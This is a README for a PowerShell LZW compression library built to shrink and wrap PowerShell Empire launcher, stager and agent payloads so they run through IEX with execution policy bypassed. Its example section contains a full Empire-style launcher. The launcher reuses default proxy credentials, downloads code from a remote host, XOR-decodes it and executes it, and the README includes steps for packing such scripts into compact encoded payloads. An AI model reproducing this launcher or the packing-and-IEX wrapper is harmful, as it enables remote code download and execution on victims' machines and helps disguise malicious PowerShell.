License
-------

DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE 

Version 2, December 2004 
                    
Copyright (C) 2004 Sam Hocevar <sam@hocevar.net> 

Everyone is permitted to copy and distribute verbatim or modified 

copies of this license document, and changing it is allowed as long 

as the name is changed. 

DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE 
           
TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION 

0. You just DO WHAT THE FUCK YOU WANT TO.



Powershell developper ?
-----------------------
I'm far away from a real Powershell developper, so be free to propose improvements and code size reduction tricks.


PoshLZW
--------
`PowerShell LZW` is a LZW compression/decompression library for Powershell 2.0


Powershell 2.0 ?
----------------
By default, if you wanna have compatility you'll have to use v2.0, as it's the case for PowerShell Empire.


iCodingSize !!?
---------------
LZW work by building a ephemeral dictionnary, feeded then by following bytes. The main idea is to encode bytes not on 8-bits but on iCodingSize-bits (9 to 15).

Why min at 9 ? 'cause less would mean size growth.

Why max at 15 ? Well... why not ;-)

So for example, 4-bytes can be encoded only on 9 bits (if you choose an iCodingSize value of 9 and if it's in the dictionnary).

This value is also the maximum size of the dictionnary : 2^iCodingSize-1.

It's stored in the output at index 0, encoded on 8-bits (a normal byte).


Five functions
---------------
Five Long functions :
* Bits-Shift : a simple bits shifting function that don't fucking exists in Powershell 2 !!?
* Bits-Read : read n-bits from an array of Bytes, at a certain position
* Bits-Write : write n-bits to an array of Bytes, at a certain position
* LZWCompress : Compress
* LZWDecompress : Decompress

These too long functions have been manually shortened to save space:
* bs (for Bits-Shift), 62 bytes long
* br (for Bits-Read), 225 bytes long
* bw (for Bits-Write), 247 bytes long
* lzwc (for LZWCompress), 395 bytes long
* lzwd (for LZWDecompress), 345 bytes long

Could certainly be optimized ;-)


Powershell script intended to be executed
-----------------------------------------
To use LZW it's simple :

1/ Declare functions (or import-module PoshLZW.ps1)

```PS> $m_=[math];
$ PS > function bs{...
$ PS > function bw{...
$ PS > function lzwc{...
```


2/ compress your powershell script :

```PS> $MyScript = "write-host 'Hello World';";
$ PS > $lz = lzwc $MyScript 10;
```

3/ encode the compressed script in base64
```$ PS > $lz64 = [convert]::ToBase64String($lz);
```


4/ Build the payload with the overhead :
```PS> $payload = '$m_=[math];';
$ PS > $payload+= 'function bs{...' + 'function br{...' + 'function lzwd{...';
$ PS > $payload+= 'IEX(lzwd ([byte[]]([System.Convert]::FromBase64String("'+$lz64+'"))))';
```

Then you can execute the payload with #>powershell -nop -noni -ex bypass -c here-the-payload.

But take care about the command line size ;-)



Good rate ?
----------------
Here you'll find a comparison table of different payloads.
* Text : normal ps1 file/payload, without optimisation.
* H : overhead of 701 bytes (LZWDecompress, Bits-Read, Bits-Shift and IEX).
* 9-15 : iCodingSize, meaning encoding size in bits and also dictionnary size.
A way to use compression could be to run "powershell -c H+B64(LZW(T,9))"

 
|                      | Launcher | Stager |  Agent  |
|----------------------|----------|--------|---------|
|       Text as T      |   418    |  4 909 |  44 041 |
|           B64(T)     | 1 116    | 13 092 | 117 444 |
|           LZW(T,9)   |   387    |  3 740 |  27 878 |
|     H+B64(LZW(T,9)   | 2 051    | 13 877 |  97 516 |
| B64(H+B64(LZW(T,9))  | 5 472    | 37 008 | 260 044 |
|           LZW(T,10)  |   426    |  3 260 |  24 934 |
|     H+B64(LZW(T,10)  | 2 112    | 12 127 |  85 885 |
| B64(H+B64(LZW(T,10)) | 5 632    | 32 340 | 229 028 |
|           LZW(T,11)  |   469    |  3 145 |  20 474 |
|     H+B64(LZW(T,11)  | 2 261    |`11 576`|  72 444 |
| B64(H+B64(LZW(T,11)) | 6 032    | 30 872 | 193 184 |
|           LZW(T,12)  |   511    |  3 373 |  18 312 |
|     H+B64(LZW(T,12)  | 2 237    | 11 600 |  63 583 |
| B64(H+B64(LZW(T,12)) | 5 968    | 30 936 | 169 556 |
|           LZW(T,13)  |   554    |  3 654 |  16 589 |
|     H+B64(LZW(T,13)  | 2 426    | 12 788 | `58 306`|
| B64(H+B64(LZW(T,13)) | 6 472    | 34 104 | 155 484 |
|           LZW(T,14)  |   596    |  3 935 |  17 545 |
|     H+B64(LZW(T,14)  | 2 481    | 13 243 |  59 852 |
| B64(H+B64(LZW(T,14)) | 6 616    | 35 316 | 159 608 |
|           LZW(T,15)  |   639    |  4 216 |  18 798 |
|     H+B64(LZW(T,15)  | 2 611    | 13 944 |  63 437 |
| B64(H+B64(LZW(T,15)) | 6 964    | 37 184 | 169 168 |



Example
-------

Stats
````$ PS > $text = '$Wc=NEW-ObjEcT SYStEM.Net.WEBCliENT;$u="Test/5.0 (Windows NT 5.1; Trident/1.0;) like Gecko";$wc.HeADerS.ADD("User-Agent",$u);$wc.ProXY = [SYSTem.Net.WEBREQuEsT]::DEFAulTWebPROXY;$WC.PRoxy.CReDEnTIaLS = [SYStEM.NET.CRedEnTiALCACHe]::DEFAulTNetwORKCredenTiaLs;$K="aaaaaaaabbbbbbbbcccccccceeeeeeee";$I=0;[chAr[]]$b=([CHAr[]]($wC.DowNlOaDSTRing("http://1.2.3.4:80/index.asp")))|%{$_-BXoR$k[$i++%$k.LeNgTH]};IEX ($B-jOIn"")';
$ PS > #$text = [System.Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes("stager.ps1"));
$ PS > #$text = [System.Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes("agent.ps1"));
$ PS > write-host "|                 Text   |" $text.length
$ PS > write-host "|             B64(Text)  |" ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text))).length
$ PS > foreach ($i in 9..15){
$ PS > 	$lzw = lzwc $text $i;
$ PS > 	write-host "|           LZW(T,$i)  |" $lzw.length;
$ PS > 	$64lzw = [convert]::ToBase64String($lzw);
$ PS > 	$overhead='$m_=[math];function bs{param($v,$s)return $m_::Floor($v*$m_::Pow(2,-$s))}function br{param($o,$c,$a)$p=$i=$e=0;$j=$m_::floor(($t=$a.value)*$c/8);$s=($r=8-(($t*$c)%8))-$c;$b=$m_::Pow(2,$c)-1;while($e-lt$c){$p=$p-bor((bs $o[$j+$i] $s)-band$b);$e+=$r;$r=$m_::max($r,8);$s+=8;$i++}$a.value++;return $p}';
$ PS > function lzwd{param($p)$a=$j=0;$v=@();$e=$o="";$c=$p[0];$p=$p[1..$p.length];foreach($i in 0..255){$v+=[string]([char]$i)}$o+=($w=[string]$v[($j=br $p $c ([ref]$a))]);while([math]::floor($a*$c/8)-lt($p.length-1)){$l=$v.count;$j=br $p $c ([ref]$a);$o+=$v[$j];if($j-lt$l){$e=[string]$v[$j]}elseif($j-eq$l){$e=$w+$w[0]}$v+=$w+$e[0];$w=$e}return $o;}IEX(lzwd ([byte[]]([System.Convert]::FromBase64String("'+$lzw+'"))))';
$ PS > 	write-host "|     H+B64(LZW(T,$i)  |" $overhead.length;
$ PS > 	$b64hz = [convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($overhead));
$ PS > 	write-host "| B64(H+B64(LZW(T,$i)) |" $b64hz.length;
$ PS > }
````

Last word ?
-----------

````
         ///\\\  ( Have Fun )
        ( ^  ^ ) /
      __(  __  )__
     / _ `----' _ \
     \__\   _   |__\
      (..) _| _ (..)
       |____(___|     Mynameisv_ 2016
_ __ _ (____)____) _ _________________________________ _'
````